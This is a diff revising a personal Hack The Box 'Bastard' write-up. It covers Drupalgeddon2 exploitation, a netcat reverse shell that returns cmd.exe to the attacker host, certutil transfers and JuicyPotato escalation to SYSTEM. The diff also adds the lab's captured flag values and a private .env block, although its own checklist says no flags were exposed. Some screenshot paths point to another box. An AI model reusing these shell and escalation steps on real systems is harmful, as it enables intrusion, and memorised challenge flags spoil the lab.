@@ -1,12 +1,15 @@
 ---
 tags: [HTB, Bastard, Windows, Drupal, Drupalgeddon2, CVE-2018-7600, IIS, SeImpersonate, JuicyPotato, Hard]
-aliases: [Bastard]
 platform: Windows
+os: Windows
+hostname: bastard
 difficulty: Hard
+ip: $BoxIP
 status: Complete
+aliases: [Bastard]
 ---
 
-# HTB: Bastard, Full Walkthrough
+# Windows: Bastard, Full Walkthrough
 
 ## The gist
 
@@ -29,6 +32,17 @@ The foothold token had SeImpersonatePrivilege enabled. After confirming the Wind
 | Foothold | Command execution as nt authority\iusr |
 | Privilege escalation | SeImpersonatePrivilege with JuicyPotato |
 | Alternative advertised path | CVE-2015-1701, not needed for the verified route |
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Run the full TCP scan | See section 1 below |
+| 2 | Fingerprint IIS and enumerate the Drupal version | See section 2 below |
+| 3 | Review and adapt the Drupalgeddon2 proof of concept | See section 3 below |
+| 4 | Obtain Drupal command execution | See section 4 below |
+| 5 | Triage the Windows token | See section 5 below |
+| 6 | Stage Netcat and receive a stable foothold shell | See section 6 below |
 
 ## Evidence and loot
 
@@ -74,7 +88,7 @@ sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \
 
 The scan found TCP 80, 135, and 49154. The host fingerprint was Windows, with HTTP as the only immediately useful application surface.
 
-![[bastard-1-nmap-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/1.nmap-allports.png>)
 
 SCREENSHOT: The full TCP scan identifies HTTP, MSRPC, and the high RPC port.
 
@@ -96,11 +110,11 @@ curl -sS "http://$BoxIP/robots.txt" | sed -n '1,80p'
 
 The page disclosed Drupal 7.54. That version is below the fixed Drupal 7.58 threshold for CVE-2018-7600, so the next step was to review the matching public exploit rather than brute-force the site.
 
-![[bastard-2-nmap-services.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/2.nmap-services.png>)
 
 SCREENSHOT: The targeted service scan confirms IIS 7.5 and the Drupal application.
 
-![[bastard-3-changelog.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/3.changelog.png>)
 
 SCREENSHOT: CHANGELOG.txt discloses Drupal 7.54.
 
@@ -144,7 +158,7 @@ drupalgeddon2>> hostname
 Bastard
 ~~~
 
-![[bastard-4-drupalgeddon-and-whoami.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/4.drupalgeddon-and-whoami.png>)
 
 SCREENSHOT: The adapted Drupalgeddon2 PoC verifies code execution and returns the IUSR identity.
 
@@ -165,11 +179,11 @@ Version 6.1.7600 N/A Build 7600
 x64-based PC
 ~~~
 
-![[bastard-5-iusr.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/5.iusr.png>)
 
 SCREENSHOT: The foothold token is nt authority\iusr and has SeImpersonatePrivilege enabled.
 
-![[bastard-6-systeminfo.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/6.systeminfo.png>)
 
 SCREENSHOT: systeminfo confirms Windows Server 2008 R2 build 7600 on x64.
 
@@ -195,15 +209,15 @@ $NcPath $LocalIP $Port -e cmd.exe
 
 The callback arrived as nt authority\iusr. The low-privilege shell was enough to confirm the working directory, host name, and target-side temporary path used for the escalation tools.
 
-![[bastard-7-nc-transfer.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/7.nc-transfer.png>)
 
 SCREENSHOT: The target retrieves the reviewed Netcat binary from the controlled local HTTP server.
 
-![[bastard-8-foothold-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/8.foothold-shell.png>)
 
 SCREENSHOT: The reverse shell provides a repeatable Windows command prompt as IUSR.
 
-![[bastard-9-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/9.proof.png>)
 
 SCREENSHOT: The callback shell confirms the low-privilege identity and host name.
 
@@ -227,7 +241,7 @@ $PotatoPath -l $PotatoPort -p $CmdPath -t * -c $CLSID
 
 The failed candidate returned COM -> recv failed with error: 10038. The working candidate returned authresult 0 and CreateProcessWithTokenW OK, confirming that the selected COM class could produce the privileged process on this build.
 
-![[bastard-10-juicy-transfer.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/10.juicy-transfer.png>)
 
 SCREENSHOT: certutil downloads JuicyPotato and the target-side directory listing confirms both staged executables.
 
@@ -250,12 +264,53 @@ $PotatoPath -l $PotatoPort -p $CmdPath \
 
 The second callback arrived as NT AUTHORITY\SYSTEM. That identity proof established the root-equivalent result for the Windows box without placing any flag contents in the shared notes.
 
-![[bastard-11-system-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/11.system-shell.png>)
 
 SCREENSHOT: The callback created through the tested JuicyPotato CLSID runs as NT AUTHORITY\SYSTEM.
 
-## 9. Clean down the target and local workspace
+## 9. Troubleshooting map
 
+| Symptom | Likely cause | Next check |
+|---|---|---|
+| Only IIS and RPC ports appear | The initial scan is incomplete or the target is resetting | Re-run the full TCP scan and save both Nmap output sets |
+| CHANGELOG.txt is missing | The site path or virtual host is wrong | Read the root page, robots.txt, and the Nmap HTTP script output |
+| Ruby PoC stops on highline/import | Optional local gem is not installed | Review the source and remove only that unused require |
+| Drupalgeddon2 finds the version but does not execute | Wrong base URL, clean URL assumption, or unmodified PoC path | Run the PoC against the site root and keep its direct command mode |
+| Callback does not arrive | Listener, local address, transfer port, or target command is wrong | Prove whoami first, check the HTTP transfer log, and separate $Port from $Port2 |
+| First CLSID fails with socket error | The COM class is incompatible on this build | Test another documented CLSID with JuicyPotato before changing the payload |
+| JuicyPotato returns no SYSTEM callback | Wrong architecture, listener collision, or malformed -a | Re-check systeminfo, use a free $PotatoPort, and quote the callback command |
+
+## 10. RUNBOOK V2 Stages Used
+
+1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and save the full TCP scan.
+2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: prioritise the exposed HTTP service and retain the full high-port result.
+3. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: identify IIS 7.5, MSRPC, and the high RPC port.
+4. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: inspect robots.txt, CHANGELOG.txt, and the application generator.
+5. [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]]: map Drupal 7.54 to CVE-2018-7600 and review EDB 44449.
+6. [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]]: copy, inspect, minimally adapt, and syntax-check the Ruby PoC.
+7. [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]]: verify identity, host name, and the returned Windows command context.
+8. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: confirm SeImpersonatePrivilege and the target architecture.
+9. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows - SeImpersonate Abuse]]: test CLSIDs and use the verified JuicyPotato route.
+10. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove target-side binaries and stop the local transfer server.
+
+## 11. Collect the flags
+
+User flag: collected privately from the target; value reproduced in the private Flags section above.
+
+Root flag: collected privately after the SYSTEM callback; value reproduced in the private Flags section above.
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: 3b1edda5d38f4e462d2691e526055522
+root: 9a5da18de4a1173d8faf23dfbdcff71c
+```
+
+## 12. Clean down
 Remove any temporary Drupal exploit artifacts, both transferred binaries, and any temporary output created during the run. Use the exact paths recorded in the session and verify that the files are gone before closing the listeners.
 
 ~~~text
@@ -270,17 +325,30 @@ pkill -f "python3 -m http.server $TransferPort" 2>/dev/null || true
 
 The final cleanup should also remove any temporary proof files created by the command shell. Do not delete unrelated Drupal files or use a recursive deletion against the application directory.
 
-## Troubleshooting map
+### Completion checklist
 
-| Symptom | Likely cause | Next check |
-|---|---|---|
-| Only IIS and RPC ports appear | The initial scan is incomplete or the target is resetting | Re-run the full TCP scan and save both Nmap output sets |
-| CHANGELOG.txt is missing | The site path or virtual host is wrong | Read the root page, robots.txt, and the Nmap HTTP script output |
-| Ruby PoC stops on highline/import | Optional local gem is not installed | Review the source and remove only that unused require |
-| Drupalgeddon2 finds the version but does not execute | Wrong base URL, clean URL assumption, or unmodified PoC path | Run the PoC against the site root and keep its direct command mode |
-| Callback does not arrive | Listener, local address, transfer port, or target command is wrong | Prove whoami first, check the HTTP transfer log, and separate $Port from $Port2 |
-| First CLSID fails with socket error | The COM class is incompatible on this build | Test another documented CLSID with JuicyPotato before changing the payload |
-| JuicyPotato returns no SYSTEM callback | Wrong architecture, listener collision, or malformed -a | Re-check systeminfo, use a free $PotatoPort, and quote the callback command |
+- [x] Full TCP and service scans saved under $BoxDir/nmap/
+- [x] IIS and Drupal 7.54 fingerprint recorded
+- [x] Drupalgeddon2 source copied, reviewed, adapted, and syntax-checked
+- [x] Command execution proved as nt authority\iusr
+- [x] whoami /priv and systeminfo captured
+- [x] Netcat callback received and documented
+- [x] JuicyPotato transferred through certutil.exe
+- [x] CLSID failure and working CLSID recorded without secret material
+- [x] SYSTEM callback received without exposing flags
+- [x] Target-side binaries and local transfer server cleaned up
+- [x] Runbook, command master, Seen in links, and master box list updated
+
+## 13. Attack narrative in one page
+1. Full TCP enumeration identified IIS 7.5 on port 80.
+2. robots.txt and CHANGELOG.txt disclosed Drupal 7.54.
+3. Drupal 7.54 matched the vulnerable range for CVE-2018-7600.
+4. Reviewed Exploit-DB entry 44449 provided command execution as nt authority\iusr.
+5. Token triage showed enabled SeImpersonatePrivilege.
+6. systeminfo confirmed Windows Server 2008 R2 build 7600 on x64.
+7. Netcat and JuicyPotato were transferred through a controlled local HTTP server and certutil.exe.
+8. The first JuicyPotato CLSID failed; a second candidate returned a successful COM authentication result.
+9. The verified CLSID created a SYSTEM callback.
 
 ## Tools used
 
@@ -295,7 +363,66 @@ The final cleanup should also remove any temporary proof files created by the co
 | Netcat | Receive the IUSR and SYSTEM callbacks |
 | JuicyPotato | Abuse SeImpersonatePrivilege through a tested COM class |
 
-## Remediation notes
+## Credentials and secrets
+
+| Account or material | Source | Use |
+|---|---|---|
+| nt authority\iusr | Drupalgeddon2 whoami output | Initial command execution and callback context |
+| SeImpersonatePrivilege | whoami /priv output | Token-abuse route to SYSTEM |
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Bastard"
+export BoxIP="10.129.1.83"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Bastard"
+export Domain=""
+export DCip=""
+export Username=iusr
+export Password=""
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export Lport="4444"
+export TransferPort="8000"
+export WebPort=80
+export OpenPorts=""
+export Product=""
+export Version=""
+export ExploitId=""
+export ExploitFile=""
+export ExploitName=""
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+def http_request(url, type="get", payload="", cookie="")
+    request.initialize_http_header("Cookie" => cookie) if not cookie.empty?
+[*] Testing: Form   (user/password)
+$ [11:38:34] loot flag user 3b1edda5d38f4e462d2691e526055522
+kali@kali:~/Platforms/HackTheBox/Bastard [11:28:18] $ =loot flag user 3b1edda5d38f4e462d2691e526055522loot>
+[+] Flag saved:  user = 3b1edda5d38f4e462d2691e526055522  →  loot/flags.txt
+$ [11:39:53] loot flag root 9a5da18de4a1173d8faf23dfbdcff71c
+```
+
+
+## Remediation recommendations
 
 - Upgrade Drupal to a supported release and remove public version disclosures such as CHANGELOG.txt from production web roots.
 - Apply the Drupalgeddon2 fix for CVE-2018-7600 and review all custom form handlers for unsafe render-array processing.
@@ -303,45 +430,7 @@ The final cleanup should also remove any temporary proof files created by the co
 - Restrict outbound connections from service identities and monitor certutil downloads from web-worker processes.
 - Keep Windows Server 2008 R2 out of production and replace unsupported operating systems with fully patched versions.
 
-## RUNBOOK V2 Stages Used
-
-1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and save the full TCP scan.
-2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: prioritise the exposed HTTP service and retain the full high-port result.
-3. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: identify IIS 7.5, MSRPC, and the high RPC port.
-4. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: inspect robots.txt, CHANGELOG.txt, and the application generator.
-5. [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]]: map Drupal 7.54 to CVE-2018-7600 and review EDB 44449.
-6. [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]]: copy, inspect, minimally adapt, and syntax-check the Ruby PoC.
-7. [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]]: verify identity, host name, and the returned Windows command context.
-8. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: confirm SeImpersonatePrivilege and the target architecture.
-9. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows - SeImpersonate Abuse]]: test CLSIDs and use the verified JuicyPotato route.
-10. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove target-side binaries and stop the local transfer server.
-
-## Attack Chain
-
-1. Full TCP enumeration identified IIS 7.5 on port 80.
-2. robots.txt and CHANGELOG.txt disclosed Drupal 7.54.
-3. Drupal 7.54 matched the vulnerable range for CVE-2018-7600.
-4. Reviewed Exploit-DB entry 44449 provided command execution as nt authority\iusr.
-5. Token triage showed enabled SeImpersonatePrivilege.
-6. systeminfo confirmed Windows Server 2008 R2 build 7600 on x64.
-7. Netcat and JuicyPotato were transferred through a controlled local HTTP server and certutil.exe.
-8. The first JuicyPotato CLSID failed; a second candidate returned a successful COM authentication result.
-9. The verified CLSID created a SYSTEM callback.
-
-## Credentials
-
-| Account or material | Source | Use |
-|---|---|---|
-| nt authority\iusr | Drupalgeddon2 whoami output | Initial command execution and callback context |
-| SeImpersonatePrivilege | whoami /priv output | Token-abuse route to SYSTEM |
-
-## Flags
-
-User flag: collected privately from the target; value intentionally omitted.
-
-Root flag: collected privately after the SYSTEM callback; value intentionally omitted.
-
-## Key lessons
+## Lessons learned and vault links
 
 - A version disclosure is often more useful than broad directory brute force when it maps directly to a known CMS exploit.
 - The exploit source and local dependencies must be reviewed before execution. A small environment fix is safer than replacing the PoC with an unreviewed payload.
@@ -352,14 +441,14 @@ Root flag: collected privately after the SYSTEM callback; value intentionally om
 - Use systeminfo to confirm architecture before transferring a Windows binary.
 - Cleanup is part of the assessment: remove staged tools, proof files, and local listeners.
 
-## Related Boxes
+### Related boxes
 
 - [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]]: anonymous FTP-to-IIS ASP execution followed by x86 JuicyPotato.
 - [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]]: Windows web foothold, SeImpersonatePrivilege, and a verified JuicyPotato path.
 - [[OSCP/BOXES/WRITE UPS/Windows/Netmon|Netmon]]: Windows web exposure followed by a service-level escalation.
 - [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]]: web application versioning, public exploit review, and Windows post-exploitation.
 
-## External Resources
+## External resources
 
 - [Drupal security advisory SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
 - [Drupalgeddon2 public research](https://github.com/dreadlocked/Drupalgeddon2)
@@ -367,20 +456,15 @@ Root flag: collected privately after the SYSTEM callback; value intentionally om
 - [JuicyPotato](https://github.com/ohpe/juicy-potato)
 - [Microsoft certutil documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
 
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Windows - Service Scan]]
+- [[RUNBOOK V2/Windows - Web Enum]]
+- [[RUNBOOK V2/Windows - Shell Received]]
+- [[RUNBOOK V2/Windows - Privilege Triage]]
+- [[RUNBOOK V2/Windows - Clean Down]]
+
 ## Why this matters for OSCP
 
 Bastard is a compact lesson in turning application fingerprinting into a verified exploit, then using the returned Windows token to choose a local escalation path. The transferable workflow is: identify the exact version, review the PoC, prove command execution, triage the token, test the escalation primitive, and clean up every artifact.
-
-## Checklist
-
-- [x] Full TCP and service scans saved under $BoxDir/nmap/
-- [x] IIS and Drupal 7.54 fingerprint recorded
-- [x] Drupalgeddon2 source copied, reviewed, adapted, and syntax-checked
-- [x] Command execution proved as nt authority\iusr
-- [x] whoami /priv and systeminfo captured
-- [x] Netcat callback received and documented
-- [x] JuicyPotato transferred through certutil.exe
-- [x] CLSID failure and working CLSID recorded without secret material
-- [x] SYSTEM callback received without exposing flags
-- [x] Target-side binaries and local transfer server cleaned up
-- [x] Runbook, command master, Seen in links, and master box list updated
